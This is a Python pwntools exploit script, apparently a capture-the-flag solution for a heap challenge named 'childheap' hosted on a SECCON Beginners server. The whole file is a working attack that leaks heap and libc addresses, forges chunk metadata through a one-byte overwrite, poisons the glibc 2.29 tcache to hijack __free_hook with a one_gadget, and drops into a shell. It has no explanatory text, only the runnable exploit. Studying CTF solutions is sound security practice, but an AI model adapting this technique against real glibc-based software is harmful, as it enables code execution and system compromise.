from pwn import *
import sys

#import kmpwn
#sys.path.append('/home/vagrant/kmpwn')
#from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "childheap"
#"""
HOST = "childheap.quals.beginners.seccon.jp"
PORT = 22476
libc = ELF('./libc-2.29.so')
gadget = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]
"""
HOST = "localhost"
PORT = 7777 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget = [0x4f322, 0x4f2c5, 0x10a38c]
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./libc-2.29.so')
#libc_binsh = next(libc.search("/bin/sh"))
off_free_hook = libc.symbols["__free_hook"]
off_unsorted = libc.symbols["__malloc_hook"]+0x70

# to debug
def fin():
	conn.sendlineafter("> ", "0")

def alloc(size, data):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(": ", str(size))
	conn.sendafter(": ", data)

def delete(t):
	conn.sendlineafter("> ", "2")
	conn.recvuntil(": \'")
	content = conn.recvuntil("\'")[:-1]
	if t:
		conn.sendlineafter("] ", "y")
	else:
		conn.sendlineafter("] ", "n")
	return content
	
	
def wipe():
	conn.sendlineafter("> ", "3")

def one_chk(size, data):
	alloc(size, data)
	delete(True)
	wipe()

def exploit():
	for i in range(7):
		one_chk(0xf8+i*0x10, "p")
	one_chk(0xf8, "1"*0xf8)
	alloc(0x108, "2"*0x108)
	delete(True)

	first_chk = delete(False)
	first_chk = u64(first_chk+"\x00"*(8-len(first_chk)))
	heap_base = first_chk - 0x260
	print(hex(heap_base))
	wipe()
	for i in range(2,7):
		one_chk(0xf8+i*0x10, "A"*(0xf8+i*0x10)) #0xf8 ~ 0x158
	
	off_target = 0x250+0x260*3+0x130

	one_chk(0x178, "a")
	one_chk(0x168, "b")
	one_chk(0x18, "c")
	pay = "\x00"*0x10
	pay += "\x00"*0x18 #base+off_target+0x10+0x10
	pay += p64(heap_base+off_target+0x40)
	pay += "\x00"*0x8 #0x38
	pay += p64(0x141)
	pay += p64(heap_base+off_target+0x20)
	pay += p64(heap_base+off_target+0x28)
	pay += "x"*(0x170 - len(pay))
	pay += p64(0x140)

	one_chk(0x178, pay) # important 0x178
	pay = "\x00"*0xf8
	pay += p64(0x21)
	pay += "\x00"*0x18
	pay += p64(0x21)

	alloc(0x168, pay)
	delete(True)
	wipe()

	one_chk(0x128, "p")
	one_chk(0x108, "p") #unsorted bin is expired

	pay = "A"*0x38
	pay += "\x01\x01"
	one_chk(0x178, pay) #important 0x178
	#
	pay = "A"*0xf0
	pay += p64(0x100)
	pay += p64(0x21)
	pay += "A"*0x18
	pay += p64(0x21)
	pay += p64(0x131)
	alloc(0x128, pay)  
	delete(True)		# size 0x100 is fulled ,so stored in unsorted 
	libc_unsorted = delete(False)
	
	libc_unsorted = u64(libc_unsorted + "\x00"*(8-len(libc_unsorted)))
	libc_base = libc_unsorted - off_unsorted
	libc_free_hook = libc_base + off_free_hook	
	one_gadget = libc_base + gadget[3]	
	wipe()
	print hex(libc_base)	
	# use chk from tcache (size = 0x100)
	alloc(0xf8, "pokemon")

	wipe()
	pay = "A"*0x38
	pay += "\x31\x01\n"
	one_chk(0x178, pay) # overwrite 0x100 -> 0x131

	one_chk(0x128, "pokemon") # tcache 0x130
	pay = "A"*0x38
	pay += "\x01\x01\n"
	one_chk(0x178, pay)
	one_chk(0x128, "pokemon") # tcache 0x100
	#debug	
	
	pay = "A"*0x38
	pay += p64(0x101) 
	pay += p64(libc_free_hook)
	one_chk(0x178, pay)
	alloc(0xf8, "p")
	wipe()
	print hex(off_unsorted)
	print hex(libc_base)
	alloc(0xf8, p64(one_gadget))
	delete(True)
	#fin()
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
